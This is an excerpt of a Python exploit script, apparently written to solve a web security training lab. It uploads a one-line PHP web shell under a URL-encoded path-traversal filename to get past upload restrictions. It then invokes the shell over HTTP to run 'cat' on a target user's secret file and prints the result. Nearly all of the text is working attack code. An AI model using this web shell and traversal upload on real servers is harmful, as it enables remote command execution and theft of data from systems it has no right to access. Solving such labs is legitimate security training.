...
def upload_file():
   ...
   file = {
        "avatar": ("%2e%2e%2fwebshell.php", "<?php system($_GET['cmd']); ?>", "application/x-php"),
    }
...
def execute_command():
    response = requests.get(f"{lab_url}/files/webshell.php?cmd=cat%20/home/carlos/secret", cookies={"session": cookie})
    print(response.text)
...
if __name__ == "__main__":
    try:
        ...
        upload_file()
        print(f"File has been uploaded here: {lab_url}/files/webshell.php")
